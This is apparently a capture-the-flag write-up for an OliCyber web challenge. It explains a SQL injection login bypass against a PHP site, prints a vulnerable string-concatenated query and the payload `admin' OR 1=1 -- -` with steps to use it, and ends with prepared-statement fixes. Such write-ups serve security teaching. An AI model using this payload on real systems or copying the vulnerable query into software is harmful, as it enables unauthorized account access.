# Basic SQLi

**Competition:** OliCyber<br>
**Category:** Web / SQL Injection<br>
**URL:** http://basic-sqli.challs.olicyber.it

---

## Description

> I built my first PHP website and stored a flag in my "admin" account — can you steal it?

A login page vulnerable to SQL injection. The goal is to bypass authentication and gain access to the admin account.

---

## Solution

### Step 1 — Site Analysis

The site presents a simple login form with two fields:
- **Username**
- **Password**

The page hints that the flag is stored in the admin account.

---

### Step 2 — Identifying the Vulnerability

The site is vulnerable to **SQL Injection**. The PHP query behind the login form is likely something like:

```php
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'";
```

If this query is executed without input sanitization, we can manipulate it by injecting special SQL characters.

---

### Step 3 — Crafting the SQL Injection Payload

To bypass authentication and access the admin account, we use the following payload in the username field:

```
admin' OR 1=1 -- -
```

Payload breakdown:

| Part | Purpose |
|---|---|
| `admin'` | Closes the string and targets the admin username |
| `OR 1=1` | Adds a condition that is always true |
| `-- -` | Comments out the rest of the query (including the password check) |

The query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' OR 1=1 -- -' AND password = 'whatever'
```

Which is equivalent to:

```sql
SELECT * FROM users WHERE username = 'admin' OR 1=1
```

This query always returns the admin account, bypassing the password check entirely.

---

### Step 4 — Running the Exploit

1. Visit the site: http://basic-sqli.challs.olicyber.it
2. In the **Username** field, enter: `admin' OR 1=1 -- -`
3. In the **Password** field, enter: any value (e.g. `password`)
4. Click the "Sign in" button

---

### Step 5 — Result

After submitting the form with the SQL injection payload, the page shows:

```
Hello Admin!
The flag is flag{...}
```

---

## Vulnerability Exploited

| Aspect | Detail |
|---|---|
| **Type** | SQL Injection (SQLi) |
| **Root Cause** | Unsanitized input concatenated directly into the SQL query |
| **Vector** | POST parameters `username` and `password` |
| **Impact** | Authentication bypass, unauthorized access |

---

## Conclusions

- **Never concatenate user input directly into SQL queries**: always use prepared statements
- Use `$_POST` with placeholders and bind parameters (e.g. `?` or `:param`)
- In PHP with MySQLi: `$stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ? AND password = ?");`
- In PHP with PDO: `$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");`
- Sanitization alone is not enough, prepared statements are the only safe approach
- The SQL comment `--` is a powerful tool for stripping parts of a query